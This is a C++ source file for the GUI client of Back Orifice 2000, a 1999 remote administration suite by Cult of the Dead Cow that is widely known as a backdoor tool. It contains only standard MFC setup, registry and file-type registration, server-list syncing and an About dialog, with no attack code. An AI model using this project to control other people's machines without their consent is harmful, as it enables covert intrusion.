/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

// bo2kgui.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "bo2kgui.h"

#include "MainFrm.h"
#include "BOWDoc.h"
#include "BOWview.h"
#include "getcomctlversion.h"
#include "comctlmsg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#pragma comment(linker,"/section:.data,rw")
#pragma comment(linker,"/section:.rdata,rw")

/////////////////////////////////////////////////////////////////////////////
// CBO2KGuiApp

BEGIN_MESSAGE_MAP(CBO2KGuiApp, CWinApp)
	//{{AFX_MSG_MAP(CBO2KGuiApp)
	ON_COMMAND(ID_APP_ABOUT, OnAppAbout)
	ON_COMMAND(ID_FILE_NEW, OnFileNew)
	//}}AFX_MSG_MAP
	ON_COMMAND(ID_FILE_OPEN, CWinApp::OnFileOpen)
	
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CBO2KGuiApp construction

CBO2KGuiApp::CBO2KGuiApp()
{
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CBO2KGuiApp object

CBO2KGuiApp theApp;

/////////////////////////////////////////////////////////////////////////////
// CBO2KGuiApp initialization

BOOL CBO2KGuiApp::InitInstance()
{
	// Standard initialization
	// If you are not using these features and wish to reduce the size
	//  of your final executable, you should remove from the following
	//  the specific initialization routines you do not need.

#ifdef _AFXDLL
	Enable3dControls();			// Call this when using MFC in a shared DLL
#else
	Enable3dControlsStatic();	// Call this when linking to MFC statically
#endif

	AfxSocketInit();

	DWORD dwHiVer,dwLoVer;
	int ret;
	ret=GetComCtlVersion(&dwHiVer, &dwLoVer);
	if((ret==-1) || (dwHiVer<4) || (dwHiVer==4 && dwLoVer<70))  {
		ComCtlMsg ccm;
		if(ccm.DoModal()==IDCANCEL)
			return FALSE;
	}

	
	// Change the registry key under which our settings are stored.
	// TODO: You should modify this string to be something appropriate
	// such as the name of your company or organization.
	SetRegistryKey(_T("Cult Of The Dead Cow"));

	LoadStdProfileSettings();  // Load standard INI file options (including MRU)

	// Register the application's document templates.  Document templates
	//  serve as the connection between documents, frame windows and views.

	CSingleDocTemplate* pDocTemplate;
	pDocTemplate = new CSingleDocTemplate(
		IDR_MAINFRAME,
		RUNTIME_CLASS(CBOWDoc),
		RUNTIME_CLASS(CMainFrame),       // main SDI frame window
		RUNTIME_CLASS(CBOWView));
	AddDocTemplate(pDocTemplate);

	// Enable DDE Execute open
	EnableShellOpen();
	RegisterShellFileTypes(TRUE);
	COleObjectFactory::UpdateRegistryAll(TRUE);

	// Parse command line for standard shell commands, DDE, file open
	CCommandLineInfo cmdInfo;
	ParseCommandLine(cmdInfo);

	// Dispatch commands specified on the command line
	if (!ProcessShellCommand(cmdInfo))
		return FALSE;

	// The one and only window has been initialized, so show and update it.
	m_pMainWnd->ShowWindow(SW_SHOWMAXIMIZED);
	m_pMainWnd->UpdateWindow();

	// Enable drag/drop open
	m_pMainWnd->DragAcceptFiles();
	

	return TRUE;
}

int CBO2KGuiApp::ExitInstance() 
{	
	return CWinApp::ExitInstance();
}

/////////////////////////////////////////////////////////////////////////////
// CBO2KGuiApp message handlers


void CBO2KGuiApp::NewDocumentFile()
{	
	CMainFrame *cmf;
	cmf=(CMainFrame *)GetMainWnd();
	if(cmf) {
		CServerList *pSL=cmf->m_pWndServerList;
		pSL->DeleteAllItems();
	}
}

CDocument* CBO2KGuiApp::OpenDocumentFile(LPCTSTR lpszFileName) 
{
	CDocument *ret;
		
	ret=CWinApp::OpenDocumentFile(lpszFileName);
	if(ret!=NULL) {
		CServerList *pSL=((CMainFrame *)GetMainWnd())->m_pWndServerList;
		CBOWDoc *cbd=(CBOWDoc *) ((CMainFrame *)GetMainWnd())->GetActiveDocument();
		pSL->SynchToDocument(cbd);
	}

	return ret;
}


/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA
	CHyperLink m_HL_CDC;
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	virtual BOOL OnInitDialog();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

// App command to run the dialog
void CBO2KGuiApp::OnAppAbout()
{
	CAboutDlg aboutDlg;
	aboutDlg.DoModal();
}

BOOL CAboutDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();

	m_HL_CDC.SetURL("http://www.cultdeadcow.com");
	
	m_HL_CDC.SubclassDlgItem(IDC_CDC_URL,this);

	SetDlgItemText(IDC_COMPILETIME,"Compiled on "__TIMESTAMP__);	

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}
